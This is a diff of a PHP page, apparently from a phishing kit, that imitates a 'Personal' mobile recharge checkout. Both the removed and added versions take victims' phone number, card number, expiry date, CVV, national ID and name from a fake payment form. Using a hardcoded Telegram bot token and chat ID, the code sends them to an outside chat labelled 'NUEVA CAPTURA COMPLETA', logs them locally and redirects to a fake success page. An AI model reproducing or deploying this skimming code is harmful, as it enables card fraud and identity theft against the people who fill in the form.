@@ -1,72 +1,50 @@
 <?php
 /**
- * STEP 7 - DNI y Nombre + ENVÍO A TELEGRAM
- * ESTE ES EL PASO FINAL QUE ENVÍA TODO
+ * STEP 7 - VERSIÓN SIN HTML (GARANTIZADO)
  */
-session_start();
 
-// ================================
-// CONFIGURACIÓN DE TELEGRAM
-// ================================
-define('TELEGRAM_BOT_TOKEN', '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY');
-define('TELEGRAM_CHAT_ID', '-1003832913889');
+// CONFIGURACIÓN
+$TELEGRAM_BOT_TOKEN = '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY';
+$TELEGRAM_CHAT_ID = '-1003832913889';
 
-// ================================
-// CAPTURAR DNI Y NOMBRE
-// ================================
-if(isset($_POST['dni']) && isset($_POST['name'])) {
-    $_SESSION['dni'] = trim($_POST['dni']);
-    $_SESSION['name'] = trim($_POST['name']);
+// Recibir datos
+$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
+$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
+$card = isset($_POST['card']) ? trim($_POST['card']) : '';
+$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
+$cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';
+$dni = isset($_POST['dni']) ? trim($_POST['dni']) : '';
+$name = isset($_POST['name']) ? trim($_POST['name']) : '';
+
+// Si confirma pago
+if(isset($_POST['confirmar_pago'])) {
     
-    // ================================
-    // RECOPILAR TODOS LOS DATOS
-    // ================================
-    $telefono = isset($_SESSION['phone']) ? $_SESSION['phone'] : 'N/A';
-    $monto = isset($_SESSION['amount']) ? $_SESSION['amount'] : 'N/A';
-    $tarjeta = isset($_SESSION['card']) ? $_SESSION['card'] : 'N/A';
-    $vencimiento = isset($_SESSION['venc']) ? $_SESSION['venc'] : 'N/A';
-    $cvv = isset($_SESSION['cv']) ? $_SESSION['cv'] : 'N/A';
-    $dni = isset($_SESSION['dni']) ? $_SESSION['dni'] : 'N/A';
-    $nombre = isset($_SESSION['name']) ? $_SESSION['name'] : 'N/A';
-    
-    // Información técnica
     $ip = $_SERVER['REMOTE_ADDR'];
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $fecha = date('Y-m-d H:i:s');
     
-    // ================================
-    // CONSTRUIR MENSAJE PARA TELEGRAM
-    // ================================
-    $mensaje = "🔔 <b>NUEVA CAPTURA COMPLETA</b>\n";
+    // MENSAJE SIN HTML (texto plano)
+    $mensaje = "🔔 NUEVA CAPTURA COMPLETA\n";
     $mensaje .= "━━━━━━━━━━━━━━━\n\n";
+    $mensaje .= "📱 DATOS:\n";
+    $mensaje .= "Telefono: " . $phone . "\n";
+    $mensaje .= "Nombre: " . $name . "\n";
+    $mensaje .= "DNI: " . $dni . "\n\n";
+    $mensaje .= "💳 TARJETA:\n";
+    $mensaje .= "Numero: " . $card . "\n";
+    $mensaje .= "Vencimiento: " . $venc . "\n";
+    $mensaje .= "CVV: " . $cv . "\n";
+    $mensaje .= "Monto: $" . $amount . "\n\n";
+    $mensaje .= "🌐 INFO:\n";
+    $mensaje .= "IP: " . $ip . "\n";
+    $mensaje .= "Fecha: " . $fecha . "\n";
     
-    $mensaje .= "📱 <b>Datos Personales:</b>\n";
-    $mensaje .= "├ Teléfono: <code>" . htmlspecialchars($telefono) . "</code>\n";
-    $mensaje .= "├ Nombre: " . htmlspecialchars($nombre) . "\n";
-    $mensaje .= "└ DNI: " . htmlspecialchars($dni) . "\n\n";
-    
-    $mensaje .= "💳 <b>Datos Bancarios:</b>\n";
-    $mensaje .= "├ Tarjeta: <code>" . htmlspecialchars($tarjeta) . "</code>\n";
-    $mensaje .= "├ Vencimiento: " . htmlspecialchars($vencimiento) . "\n";
-    $mensaje .= "├ CVV: <code>" . htmlspecialchars($cvv) . "</code>\n";
-    $mensaje .= "└ Monto: $" . htmlspecialchars($monto) . "\n\n";
-    
-    $mensaje .= "🌐 <b>Información Técnica:</b>\n";
-    $mensaje .= "├ IP: <code>" . $ip . "</code>\n";
-    $mensaje .= "├ Navegador: " . substr(htmlspecialchars($user_agent), 0, 50) . "...\n";
-    $mensaje .= "└ Fecha: " . $fecha . "\n\n";
-    
-    $mensaje .= "⚠️ <i>Captura de prueba educativa</i>";
-    
-    // ================================
-    // ENVIAR A TELEGRAM
-    // ================================
-    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
+    // ENVIAR (EXACTAMENTE como test-envio-simple.php)
+    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
     
     $data = array(
-        'chat_id' => TELEGRAM_CHAT_ID,
-        'text' => $mensaje,
-        'parse_mode' => 'HTML'
+        'chat_id' => $TELEGRAM_CHAT_ID,
+        'text' => $mensaje
+        // SIN parse_mode
     );
     
     $ch = curl_init($url);
@@ -80,32 +58,18 @@ if(isset($_POST['dni']) && isset($_POST['name'])) {
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     
-    $enviado = ($http_code == 200);
-    
-    // ================================
-    // GUARDAR EN LOG LOCAL
-    // ================================
-    $log_file = __DIR__ . '/capturas_completas.log';
+    // Log detallado
     $log_entry = sprintf(
-        "[%s] Tel: %s | Tarjeta: %s | DNI: %s | Nombre: %s | IP: %s | Enviado: %s\n",
+        "[%s] Tel: %s | Card: %s | HTTP: %s | Result: %s\n",
         $fecha,
-        $telefono,
-        $tarjeta,
-        $dni,
-        $nombre,
-        $ip,
-        $enviado ? 'SI' : 'NO'
+        $phone,
+        $card,
+        $http_code,
+        substr($result, 0, 100)
     );
-    @file_put_contents($log_file, $log_entry, FILE_APPEND);
+    @file_put_contents(__DIR__ . '/step7_detallado.log', $log_entry, FILE_APPEND);
     
-    // ================================
-    // LIMPIAR SESIÓN
-    // ================================
-    session_destroy();
-    
-    // ================================
-    // REDIRIGIR A PÁGINA DE ÉXITO
-    // ================================
+    // Redirigir
     header('Location: success.php');
     exit;
 }
@@ -115,70 +79,69 @@ if(isset($_POST['dni']) && isset($_POST['name'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DNI y Titular | Personal</title>
+    <title>Confirmar Pago | Personal</title>
     <link rel="stylesheet" href="css/op/bootstrap.min.css">
     <link rel="stylesheet" href="css/op/styles.css">
-    <link rel="stylesheet" href="css/op/index.css">
+    <style>
+        body { background: #e5e5e5; }
+        .summary-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin: 20px auto; max-width: 500px; }
+        .summary-item { padding: 15px 0; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; }
+        .summary-item:last-child { border-bottom: none; }
+        .label { color: #666; font-weight: 600; }
+        .value { color: #333; font-family: monospace; }
+        .total { font-size: 24px; color: #00a8e1; font-weight: bold; }
+    </style>
 </head>
-<body style="background-color: #e5e5e5;">
-    <div class="container-fluid">
-        <div class="row">
-            <div class="col-12 p-0">
-                <header class="header">
-                    <nav class="px-0 pt-0">
-                        <div class="d-flex justify-content-between align-items-center">
-                            <div class="ml-3 ml-md-5">
-                                <img src="assets/flow.svg" class="pl-md-4 img-fluid" style="height: 40px;">
-                            </div>
-                            <div class="mr-3 mr-md-5">
-                                <img src="assets/secure.svg" class="pr-md-4 d-none d-sm-block" style="height: 30px;">
-                            </div>
-                        </div>
-                    </nav>
-                </header>
+<body>
+    <div class="container">
+        <div class="text-center mt-5 mb-4">
+            <img src="assets/flow.svg" style="height: 40px;">
+            <h1 style="color: #333; font-size: 28px; margin-top: 20px;">Confirmar recarga</h1>
+        </div>
 
-                <div class="row justify-content-center mt-5">
-                    <div class="col-12 text-center">
-                        <h1 class="text-center mb-4" style="color: #333; font-size: 28px;">Datos del titular</h1>
-                    </div>
-
-                    <div class="col-11 col-sm-6">
-                        <form method="POST" action="step7.php">
-                            <div class="form-group">
-                                <label style="color: #666;">DNI</label>
-                                <input type="text" name="dni" id="dni" class="form-control" placeholder="12345678" maxlength="8" style="height: 50px; font-size: 16px;" required>
-                            </div>
-
-                            <div class="form-group">
-                                <label style="color: #666;">Nombre y Apellido</label>
-                                <input type="text" name="name" id="name" class="form-control" placeholder="Juan Pérez" maxlength="50" style="height: 50px; font-size: 16px;" required>
-                            </div>
-
-                            <div class="text-center mt-4">
-                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
-                                <button type="submit" id="btnPagar" class="btn btn-success px-5 py-2" disabled style="background: #28a745; border: none; font-size: 18px; font-weight: bold;">PAGAR</button>
-                            </div>
-                        </form>
-                    </div>
-                </div>
+        <div class="summary-box">
+            <h3 style="color: #00a8e1; margin-bottom: 20px;">Resumen de tu recarga</h3>
+            
+            <div class="summary-item">
+                <span class="label">Teléfono:</span>
+                <span class="value"><?php echo htmlspecialchars($phone); ?></span>
             </div>
+            
+            <div class="summary-item">
+                <span class="label">Monto:</span>
+                <span class="value">$<?php echo htmlspecialchars($amount); ?></span>
+            </div>
+            
+            <div class="summary-item">
+                <span class="label">Tarjeta:</span>
+                <span class="value">**** <?php echo substr($card, -4); ?></span>
+            </div>
+            
+            <div class="summary-item">
+                <span class="label">Titular:</span>
+                <span class="value"><?php echo htmlspecialchars($name); ?></span>
+            </div>
+            
+            <div class="summary-item" style="border-top: 2px solid #00a8e1; margin-top: 20px; padding-top: 20px;">
+                <span class="label">Total a pagar:</span>
+                <span class="total">$<?php echo htmlspecialchars($amount); ?></span>
+            </div>
+
+            <form method="POST" action="step7.php" class="mt-4">
+                <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+                <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+                <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
+                <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
+                <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
+                <input type="hidden" name="dni" value="<?php echo htmlspecialchars($dni); ?>">
+                <input type="hidden" name="name" value="<?php echo htmlspecialchars($name); ?>">
+                
+                <div class="text-center">
+                    <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
+                    <button type="submit" name="confirmar_pago" class="btn btn-success px-5 py-3" style="background: #28a745; border: none; font-size: 20px; font-weight: bold;">CONFIRMAR Y PAGAR</button>
+                </div>
+            </form>
         </div>
     </div>
-
-    <script src="javascript/query.min.js"></script>
-    <script>
-        function validarFormulario() {
-            var dni = $('#dni').val();
-            var nombre = $('#name').val();
-            
-            if(dni.length >= 7 && nombre.length >= 3) {
-                $('#btnPagar').prop('disabled', false);
-            } else {
-                $('#btnPagar').prop('disabled', true);
-            }
-        }
-        
-        $('#dni, #name').on('keyup', validarFormulario);
-    </script>
 </body>
 </html>
